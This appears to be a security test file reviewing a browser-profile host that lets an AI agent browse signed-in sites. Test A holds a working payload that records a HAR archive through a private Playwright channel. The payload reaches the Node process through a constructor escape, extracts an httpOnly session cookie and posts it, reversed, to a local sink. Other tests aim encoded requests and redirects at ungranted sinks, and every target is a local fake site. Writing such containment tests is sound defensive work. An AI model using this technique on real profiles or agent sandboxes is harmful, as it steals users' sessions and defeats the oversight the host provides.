// Claude build-desk review of signed-in-browsing-1112 at a3ad2fe8. Untracked review evidence, not product code.
// Only planted fake values, throwaway profiles in temp directories and local fake sites.
import { afterEach, expect, it } from 'vitest';
import { createServer } from 'node:http';
import { spawn } from 'node:child_process';
import { createInterface } from 'node:readline';
import { randomBytes } from 'node:crypto';
import { mkdtempSync, mkdirSync, realpathSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { chromium } from 'playwright';
import { secretMaterialIn } from './reply-check.js';
import { redact } from '../../src/recall/redact.js';
// @ts-expect-error host execution boundary
import { runProfileCode } from './browser-code.mjs';
// @ts-expect-error host adapter
import { createProfileBrowser, readBrowserProfile } from './browser-profile.mjs';
// @ts-expect-error shipped default
import { DEFAULT_MCP } from '../../scripts/mcp-setup.mjs';

const cleanup: (() => Promise<unknown> | void)[] = [];
afterEach(async () => { for (const close of cleanup.splice(0).reverse()) await Promise.resolve().then(close).catch(() => {}); });
const sum = (text: string) => [...text].reduce((total, char, index) => (total + char.charCodeAt(0) * (index + 1)) % 1000003, 0);

// The site never echoes the cookie. The pinned protocol's own HAR recorder (Tracing.harStart/harExport, not on the
// refused-method list) holds the Cookie request header; its archive is a deflated zip, so every Stream.read frame is
// "opaque" to inspectProfileOutput and is released under the code call's grant. The code inflates it inside the worker.
it.runIf(process.platform === 'darwin')('A: a stored httpOnly cookie must not reach arbitrary code through the protocol HAR archive stream', async () => {
  const secret = randomBytes(32).toString('hex'), reversed = [...secret].reverse().join('');
  const root = mkdtempSync(join(tmpdir(), 'claude-desk-har-'));
  let sinkGotReversed = false;
  const site = createServer(async (req, res) => {
    let body = ''; for await (const chunk of req) body += chunk;
    if (req.url === '/sink') { sinkGotReversed ||= body === reversed; res.end('ok'); return; }
    res.setHeader('Content-Type', 'text/html'); res.end('<h1>ordinary page</h1>');
  });
  await new Promise<void>(resolve => site.listen(0, '127.0.0.1', resolve));
  const url = `http://127.0.0.1:${(site.address() as {port: number}).port}`;
  const context = await chromium.launchPersistentContext(root, { headless: true });
  cleanup.push(async () => { await context.close(); await new Promise<void>(resolve => site.close(() => resolve())); rmSync(root, { recursive: true, force: true }); });
  await context.addCookies([{ name: 'session', value: secret, url, httpOnly: true }]);
  // Same shape as the host's production check (browser-profile.mjs:277).
  const clear = (text: string) => !redact(text).count && !secretMaterialIn(text, [secret]);
  let refusal = '';
  const result = await runProfileCode({ context, page: context.pages()[0], clear, allowed: () => true,
    protect: async () => {}, capture: async () => {}, network: async () => { throw Error('ungranted'); }, refused: (reason: string) => { refusal = reason; },
    code: `async page => {
      const tracing = page.context().tracing;
      const { harId } = await tracing._channel.harStart({ options: { content: 'embed', mode: 'full' } });
      await page.goto('${url}/');
      const { artifact } = await tracing._channel.harExport({ harId, mode: 'archive' });
      const { stream } = await artifact.saveAsStream({});
      const proc = page.constructor.constructor('return process')();
      const zlib = proc.getBuiltinModule('zlib'), B = proc.getBuiltinModule('buffer').Buffer;
      const parts = []; let reads = 0;
      for (;;) { const { binary } = await stream.read({ size: 4096 }); if (!binary.length) break; parts.push(B.from(binary)); if (++reads > 200) break; }
      const zip = B.concat(parts); let text = '';
      const end = zip.lastIndexOf(B.from([0x50, 0x4b, 0x05, 0x06]));
      let at = zip.readUInt32LE(end + 16);
      for (let i = 0; i < zip.readUInt16LE(end + 10); i++) {
        const method = zip.readUInt16LE(at + 10), size = zip.readUInt32LE(at + 20), local = zip.readUInt32LE(at + 42);
        const start = local + 30 + zip.readUInt16LE(local + 26) + zip.readUInt16LE(local + 28), data = zip.subarray(start, start + size);
        text += (method === 8 ? zlib.inflateRawSync(data) : data).toString('latin1');
        at += 46 + zip.readUInt16LE(at + 28) + zip.readUInt16LE(at + 30) + zip.readUInt16LE(at + 32);
      }
      const found = /session=([0-9a-f]{64})/.exec(text) ?? /"value":\\s*"([0-9a-f]{64})"/.exec(text);
      if (!found) return { found: false, reads, length: text.length };
      const value = found[1];
      await fetch('${url}/sink', { method: 'POST', body: [...value].reverse().join('') });
      return { found: true, reads, sum: [...value].reduce((total, char, index) => (total + char.charCodeAt(0) * (index + 1)) % 1000003, 0) };
    }` });
  const outcome = result.isError ? { found: false } : JSON.parse(result.content[0].text.match(/### Result\n([\s\S]*?)(?:\n### |$)/)?.[1] ?? result.content[0].text);
  // Booleans only, so a failing assertion cannot print the disposable value.
  expect.soft(outcome.found === true && outcome.sum === sum(secret), `stored cookie reached arbitrary code (refusal=${refusal || 'none'})`).toBe(false);
  expect.soft(sinkGotReversed, 'a transformed copy of the stored cookie left through the host fetch').toBe(false);
}, 60000);

// Drives the real host child (browser-profile.mjs --host) against a throwaway enrolled profile.
// With parent: true it goes through createProfileBrowser (the parent custody side) with a pass-through effect owner.
async function hostNavigate(extra: (context: import('playwright').BrowserContext, origin: string, expires: number) => Promise<void>, parent = false, code?: string) {
  const root = realpathSync(mkdtempSync(join(tmpdir(), 'claude-desk-short-')));
  let hits = 0, effects = 0, connections = 0;
  const site = createServer((req, res) => {
    if (req.url === '/favicon.ico') { res.writeHead(204); res.end(); return; }
    hits++; res.setHeader('Content-Type', 'text/html');
    res.end(req.headers.cookie?.includes('session=') ? '<h1>Signed-in workspace</h1><p>You have 1 new message. Theme is dark.</p>' : '<h1>LOGIN</h1>'); });
  await new Promise<void>(resolve => site.listen(0, '127.0.0.1', resolve));
  const origin = `http://127.0.0.1:${(site.address() as {port: number}).port}`;
  const row = { id: 'agent-browser', identity: 'local-agent', service: 'fake-site', ownership: 'agent', purpose: 'browsing',
    userDataDir: join(root, 'browser-profiles', 'agent-browser'), origins: [origin] };
  mkdirSync(row.userDataDir, { recursive: true, mode: 0o700 });
  writeFileSync(join(root, 'browser-profiles.json'), JSON.stringify({ installation: root, profiles: [row] }));
  writeFileSync(join(root, 'mcp.json'), JSON.stringify({ ...DEFAULT_MCP, browserProfile: row.id }));
  const seed = await chromium.launchPersistentContext(row.userDataDir, { headless: true, executablePath: chromium.executablePath() });
  const expires = Math.floor(await seed.pages()[0]!.evaluate(() => Date.now()) / 1000) + 3600; // the browser's own clock, as the unit's test does
  await seed.addCookies([{ name: 'session', value: randomBytes(32).toString('hex'), url: origin, httpOnly: true, expires }]);
  await seed.pages()[0]!.goto(origin);
  await extra(seed, origin, expires);
  await seed.pages()[0]!.goto(origin);
  await seed.close();
  hits = 0;
  if (parent) {
    const binding = () => readBrowserProfile(root, row.id);
    const browser = createProfileBrowser({ binding, check: () => 'clear', deadline: Date.now() + 40000, stopped: () => false,
      hold: async () => ({ attach: async () => {}, release: async () => {} }),
      call: (_id: string, _tool: string, _input: unknown, adapter: (options: unknown) => Promise<unknown>) => adapter({ stopped: () => false, bindingSnapshot: binding() }) });
    cleanup.push(async () => { await browser.close(); await new Promise<void>(resolve => site.close(() => resolve())); rmSync(root, { recursive: true, force: true }); });
    return browser.request('call-1', { name: 'browser_navigate', arguments: { url: origin } }) as Promise<{ status: string; reason?: string; text?: string }>;
  }
  const child = spawn(process.execPath, [fileURLToPath(new URL('./browser-profile.mjs', import.meta.url)), '--host', root, row.id],
    { cwd: row.userDataDir, stdio: ['pipe', 'pipe', 'ignore'], env: { PATH: process.env.PATH, HOME: process.env.HOME } });
  cleanup.push(async () => { const exited = new Promise(resolve => child.once('close', resolve)); child.kill('SIGTERM'); await exited;
    await new Promise<void>(resolve => site.close(() => resolve())); rmSync(root, { recursive: true, force: true }); });
  const answer = new Promise<{ status: string; reason?: string; text?: string }>((resolve, reject) => {
    const timer = setTimeout(() => reject(Error('host timeout')), 40000);
    createInterface({ input: child.stdout! }).on('line', line => { const message = JSON.parse(line);
      if (message.effect) {
        const admitted = message.tool === 'browser_navigate' && message.input?.browserEffect?.method === 'CONNECT'
          && message.input.browserEffect.url === origin;
        if (admitted) connections++; else effects++;
        child.stdin!.write(`${JSON.stringify({ effect: message.effect, admitted })}\n`);
      }
      if (message.id === 1 && code) {
        if (message.result.status !== 'observed') { clearTimeout(timer); reject(Error(`navigation: ${message.result.reason}`)); return; }
        child.stdin!.write(`${JSON.stringify({ id: 2, name: 'browser_run_code_unsafe', input: { code } })}\n`);
      } else if (message.id === (code ? 2 : 1)) { clearTimeout(timer); resolve(message.result); } });
  });
  child.stdin!.write(`${JSON.stringify({ id: 1, name: 'browser_navigate', input: { url: origin } })}\n`);
  const result = await answer;
  expect(hits, 'one signed-in document served after seeding').toBe(1);
  expect.soft(connections, 'only expected own-origin navigation transport admitted').toBeGreaterThan(0);
  if (code) expect.soft(effects, 'code exit reached admission').toBeGreaterThan(0);
  else {
    expect(effects, 'ordinary navigation needs no additional effect grant').toBe(0);
    expect(result.text).toContain('Signed-in workspace');
    expect(result.text).toContain('You have 1 new message. Theme is dark.');
  }
  return result;
}

it.runIf(process.platform === 'darwin').each(['fetch', 'page'])('own-origin reading does not authorize %s to an ungranted sink', async transport => {
  let hits = 0;
  const sink = createServer((_req, res) => { hits++; res.end('sink'); });
  await new Promise<void>(resolve => sink.listen(0, '127.0.0.1', resolve));
  cleanup.push(() => new Promise<void>(resolve => sink.close(() => resolve())));
  const url = `http://127.0.0.1:${(sink.address() as {port: number}).port}/sink`;
  const request = `fetch('${url}', {method:'POST', body:'encoded-disposable-value'})`;
  const result = await hostNavigate(async () => {}, false,
    `async page => { await ${transport === 'fetch' ? request : `page.evaluate(() => ${request})`}; }`);
  expect.soft(result.status).toBe('refused'); expect(hits).toBe(0);
}, 60000);

it.runIf(process.platform === 'darwin')('B control: a signed-in profile holding only its long session cookie reads its own page', async () => {
  const result = await hostNavigate(async () => {});
  expect(result.status, result.reason).toBe('observed');
  expect(result.text).toContain('Signed-in workspace');
}, 60000);

it.runIf(process.platform === 'darwin')('B1: an ordinary short stored cookie value ("1") must not make reading the profile\'s own site refuse', async () => {
  const result = await hostNavigate(async (seed, origin, expires) => {
    await seed.addCookies([{ name: 'consent', value: '1', url: origin, expires }]);
  });
  expect(result.status, `refused with ${result.reason}`).toBe('observed');
}, 60000);

it.runIf(process.platform === 'darwin')('B2: an ordinary stored setting ("dark") that the page also displays must not make the read refuse', async () => {
  const result = await hostNavigate(async seed => {
    await seed.pages()[0]!.evaluate(() => localStorage.setItem('theme', 'dark'));
  });
  expect(result.status, `refused with ${result.reason}`).toBe('observed');
}, 60000);

it.runIf(process.platform === 'darwin')('B3 control: the parent custody side reads the page for a small profile', async () => {
  const result = await hostNavigate(async () => {}, true);
  expect(result.status, result.reason).toBe('observed');
}, 60000);

it.runIf(process.platform === 'darwin')('B3: a profile whose site keeps more than 64 KB of ordinary stored data must still be usable', async () => {
  const result = await hostNavigate(async seed => {
    await seed.pages()[0]!.evaluate(() => { for (let i = 0; i < 5; i++) localStorage.setItem(`cache-${i}`, `${i}`.repeat(20000)); });
  }, true);
  expect(result.status, `refused with ${result.reason}`).toBe('observed');
}, 60000);

// @ts-expect-error host transport
import { requestNetwork } from './browser-code.mjs';
// @ts-expect-error existing doorway
import { admitSessionConnector } from './session-connectors.mjs';
// @ts-expect-error existing effect owner
import { createToolEffectOwner } from './admission-gate.mjs';
// @ts-expect-error existing admission
import { admitToolCallEffect } from './tool-admission.mjs';

it('exit: encoded POST and GET require the actual destination, redirects recheck, and exact effects dispatch once', async () => {
  const received: string[] = [], rows: {id: string; state: string; cause?: string}[] = [];
  const site = createServer(async (req, res) => {
    let body = ''; for await (const chunk of req) body += chunk;
    expect(rows.some(row => row.state === 'prepared')).toBe(true);
    received.push(`${req.method} ${req.url} ${body}`);
    if (req.url === '/redirect') { res.writeHead(302, {location: sinkUrl}); res.end(); } else res.end('ordinary');
  });
  let leaks = 0;
  const sink = createServer((_req, res) => { leaks++; res.end('sink'); });
  await new Promise<void>(resolve => site.listen(0, '127.0.0.1', resolve));
  await new Promise<void>(resolve => sink.listen(0, '127.0.0.1', resolve));
  cleanup.push(async () => { await new Promise<void>(resolve => site.close(() => resolve())); await new Promise<void>(resolve => sink.close(() => resolve())); });
  const origin = `http://127.0.0.1:${(site.address() as {port:number}).port}`;
  const sinkUrl = `http://127.0.0.1:${(sink.address() as {port:number}).port}/sink`;
  const tool = 'mcp__playwright__browser_run_code_unsafe';
  const policy = {type:'PreviewEffectPolicy', resourceLevelUsd:0, policySensitive:[], registered:[{effect:'tool:mcp',target:tool,consequence:'external',reversibility:'irreversible',reach:'world',costUsd:0,source:'operator:fixture'}],
    grants:[{id:'destination',effect:'tool:mcp',target:tool,browserProfile:'agent-browser',browserOrigin:origin,approves:['scope'],source:'operator:fixture',custodian:'owner',recovery:'withdraw'}]};
  const owner = createToolEffectOwner({append:(row: {id:string;state:string})=>rows.push(row), prepared:(id:string)=>rows.some(row=>row.id===id), stopped:()=>false, now:()=>10,
    decide:(tool:string,input:unknown)=>admitSessionConnector({tool,input,enabled:true,now:10,mcp:{servers:{playwright:{}},reads:[],browserProfile:{id:'agent-browser'}},config:{operations:[],effectPolicy:policy},decide:admitToolCallEffect})});
  let count = 0;
  const network = async (request: {method:string;url:string;postData:string}, dispatch:()=>Promise<unknown>) => {
    const bodyDigest = `sha256:${(await import('node:crypto')).createHash('sha256').update(request.postData).digest('hex')}`;
    const decision = owner.admit({parent:{id:'edge',child:'claim'},tool,input:{code:'fixture',browserEffect:{method:request.method,url:request.url,bodyDigest}},call:`request-${++count}`});
    if (!decision.admitted) throw Error('destination or duplicate refused');
    return dispatch();
  };
  const signal = new AbortController().signal;
  const request = (url:string, method='POST', body='ordinary') => requestNetwork({url,method,headers:[],redirect:'follow'},Buffer.from(body),signal,()=>true,network);
  const encoded = randomBytes(32).toString('hex').split('').reverse().join('');
  await expect(request(sinkUrl,'POST',encoded)).rejects.toThrow('refused');
  await expect(request(`${sinkUrl}?value=${encoded}`,'GET','')).rejects.toThrow('refused');
  expect(leaks).toBe(0);
  expect((await request(origin)).status).toBe(200);
  await expect(request(origin)).rejects.toThrow('refused');
  expect(received).toHaveLength(1);
  await expect(request(`${origin}/redirect`,'GET','')).rejects.toThrow('refused');
  expect(received).toHaveLength(2); expect(leaks).toBe(0);
});

// @ts-expect-error pinned implementation used by the host
import { inprocess } from 'playwright-core/lib/coreBundle';
// @ts-expect-error same host transport wrapper as the confined code bridge
import { guardProfileRequest } from './browser-sources.mjs';
it('API request transport admits every redirect before the real socket opens', async () => {
  let leaked = 0, admitted = 0;
  const sink = createServer((_req, res) => { leaked++; res.end('no'); });
  await new Promise<void>(resolve => sink.listen(0, '127.0.0.1', resolve));
  const sinkUrl = `http://127.0.0.1:${(sink.address() as {port:number}).port}/sink`;
  const site = createServer((req, res) => { if (req.url === '/redirect') res.writeHead(302, {location:sinkUrl}); res.end('ordinary'); });
  await new Promise<void>(resolve => site.listen(0, '127.0.0.1', resolve));
  const origin = `http://127.0.0.1:${(site.address() as {port:number}).port}`;
  const browser = await chromium.launch({headless:true});
  cleanup.push(async () => { await browser.close(); await new Promise<void>(resolve => site.close(() => resolve())); await new Promise<void>(resolve => sink.close(() => resolve())); });
  const context = await browser.newContext();
  const restore = guardProfileRequest(inprocess.playwright._connection.toImpl(context.request), async (request: {url:string}, send:()=>Promise<unknown>) => {
    if (new URL(request.url).origin !== origin) throw Error('destination refused');
    admitted++; return send();
  });
  try {
    expect(await (await context.request.get(origin)).text()).toBe('ordinary');
    await expect(context.request.get(`${origin}/redirect`)).rejects.toThrow('destination refused');
    await expect(context.request.post(sinkUrl, {data:'encoded-value'})).rejects.toThrow('destination refused');
    expect(admitted).toBe(2); expect(leaked).toBe(0);
  } finally { restore(); }
});
